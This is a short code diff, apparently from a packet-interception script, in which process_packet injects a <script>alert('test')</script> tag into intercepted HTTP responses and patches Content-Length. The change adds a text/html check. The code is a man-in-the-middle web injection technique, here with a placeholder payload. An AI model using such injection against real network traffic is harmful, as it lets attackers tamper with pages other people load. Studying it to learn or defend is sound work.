@@ -28,7 +28,7 @@ def process_packet(pkt):
             # (?:....) to locate the regrex keywords
             injection_code = b"<script>alert('test')</script>"
             load = bytes(load.replace(b"<body>", b"<body>" + injection_code))
-            if content_length_search:
+            if content_length_search and b"text/html" in load:
                 content_length = content_length_search.group(1)
                 new_content_length = str(int(content_length) + len(injection_code))
                 load = load.replace(bytes(content_length, 'utf-8'), new_content_length.encode('utf-8'))
